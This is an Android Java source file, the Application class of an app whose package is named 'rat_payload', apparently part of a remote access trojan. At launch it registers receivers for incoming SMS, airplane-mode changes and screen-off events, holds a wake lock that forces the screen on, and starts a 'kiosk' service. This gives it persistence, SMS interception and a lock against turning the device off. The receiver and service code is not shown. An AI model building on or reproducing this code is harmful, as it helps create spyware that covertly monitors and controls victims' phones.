package com.app.rat_payload;

import android.app.Application;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.PowerManager;

import com.app.rat_payload.receivers.ArplnModeReceiver;
import com.app.rat_payload.receivers.SMSReceiver;


/**
 * Created by anirudh on 12/20/16.
 *
 *
 * Initalizes and Registers ScreenOffReceiver
 */

public class AppContext extends Application {

    private AppContext instance;
    private PowerManager.WakeLock wakeLock;
    private ScreenOffReceiver screenOffReceiver;
    private ArplnModeReceiver arplnModeReceiver;
    private SMSReceiver smsReceiver;

    @Override
    public void onCreate() {
        super.onCreate();

        instance = this;

        // Register recievers.
        registerKisoskModeScreenOffReceiver();
        registerAirplaneModeReceiver();
        registerSMSReceiver();

        System.out.println("Starting Service");

        // Start Service.
        startKioskService();

    }

    private void registerKisoskModeScreenOffReceiver() {
        // Filters out all intents when the user shuts off screen.
        final IntentFilter intentFilter = new IntentFilter(Intent.ACTION_SCREEN_OFF);
        screenOffReceiver = new ScreenOffReceiver();
        //Register Receiver.
        registerReceiver(screenOffReceiver, intentFilter);
    }

    private void registerAirplaneModeReceiver() {
        final IntentFilter intentFilter = new IntentFilter(Intent.ACTION_AIRPLANE_MODE_CHANGED);
        arplnModeReceiver = new ArplnModeReceiver();
        registerReceiver(arplnModeReceiver, intentFilter);
    }

    private void registerSMSReceiver() {
        final IntentFilter intentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        smsReceiver = new SMSReceiver();
        registerReceiver(smsReceiver, intentFilter);
    }

    public PowerManager.WakeLock getWakeLock () {
        //If WakeLock is null, set it up.
        if(wakeLock == null){
            PowerManager pw = (PowerManager) getSystemService(Context.POWER_SERVICE);
            wakeLock = pw.newWakeLock(PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "wakeup");
        }
        return wakeLock;
    }

    // Start service.
    private void startKioskService () {
        startService(new Intent(this, KioskService.class));
    }



}
